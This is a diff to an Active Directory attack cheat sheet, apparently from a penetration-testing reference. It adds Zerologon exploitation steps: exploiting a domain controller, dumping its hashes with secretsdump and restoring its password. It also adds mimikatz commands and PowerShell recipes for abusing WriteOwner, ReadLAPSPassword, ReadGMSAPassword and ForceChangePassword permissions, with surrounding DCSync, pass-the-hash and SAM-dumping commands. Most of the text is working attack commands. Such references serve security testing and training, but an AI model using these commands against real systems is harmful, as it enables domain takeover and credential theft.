@@ -51,6 +51,10 @@
       - [GenericWrite](#genericwrite)
       	- [GenericWrite and Remote Connection Manager](#genericwrite-and-remote-connection-manager)
       - [WriteDACL](#writedacl)
+      - [WriteOwner](#writeowner)
+      - [ReadLAPSPassword](#readlapspassword)
+      - [ReadGMSAPassword](#readgmsapassword)
+      - [ForceChangePassword](#forcechangepassword)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
     - [Forest to Forest Compromise - Trust Ticket](#forest-to-forest-compromise---trust-ticket)
@@ -285,17 +289,24 @@ Exploit steps from the white paper
 6. :warning: reset the computer's AD password in a proper way to avoid any Deny of Service
 
 ```powershell
-$ git clone https://github.com/cube0x0/CVE-2020-1472
-# Resetting the machine account password of DC01
-$ python3 CVE-2020-1472.py DC01 10.10.10.10
+$ git clone https://github.com/dirkjanm/CVE-2020-1472.git
 
-# Execute secretsdump to extract the ntds.dit
-$ secretsdump.py 'domain/DC01$@DC01.domain.local' -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:00000000000000000000000000000000:::  
+# Activate a virtual env to install impacket
+$ python3 -m venv venv
+$ source venv/bin/activate
+$ pip3 install .
 
-# Now reset the password back
+# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
+proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5
+
+# Find the old NT hash of the DC
+proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'
+
+# Restore password from secretsdump 
+# secretsdump will automatically dump the plaintext machine password (hex encoded) 
+# when dumping the local registry secrets on the newest version
+python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
+deactivate
 ```
 
 in .NET for Cobalt Strike's execute-assembly
@@ -331,8 +342,9 @@ lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authus
 # Pass The Hash with the extracted Domain Admin hash
 sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN
 
-# Reset password to Waza1234
 # Use IP address instead of FQDN to force NTLM with Windows APIs 
+# Reset password to Waza1234/Waza1234/Waza1234/
+# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584
 lsadump::postzerologon /target:10.10.10.10 /account:DC01$
 ```
 
@@ -474,6 +486,8 @@ Get-NetGPOGroup
 ### Exploit Group Policy Objects GPO
 
 > Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
+
+:warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: gpupdate /force. 
 
 ```powershell
 # Build and configure SharpGPOAbuse
@@ -959,7 +973,7 @@ or with the builtin Windows RDP and mimikatz
 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
 ```
 
-You can extract the local SAM database to find the local administrator hash :
+You can extract the local **SAM database** to find the local administrator hash :
 
 ```powershell
 C:\> reg.exe save hklm\sam c:\temp\sam.save
@@ -1243,6 +1257,49 @@ Import-Module .\PowerView.ps1
 $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
+```
+
+#### WriteOwner
+
+An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module).
+
+```powershell
+Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
+```
+
+This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.
+
+
+#### ReadLAPSPassword
+
+An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module.
+
+```powershell
+Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+```
+
+
+#### ReadGMSAPassword
+
+An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.
+
+```powershell
+# Save the blob to a variable
+$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+
+# Decode the data structure using the DSInternals module
+ConvertFrom-ADManagedPasswordBlob $mp
+```
+
+#### ForceChangePassword
+
+An attacker can change the password of the user this ACE applies to. 
+This can be achieved with Set-DomainUserPassword (PowerView module).
+
+```powershell
+$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 ```
 
 
@@ -1815,3 +1872,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
 * [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
 * [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020](https://www.secura.com/pathtoimg.php?id=2055)
+* [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
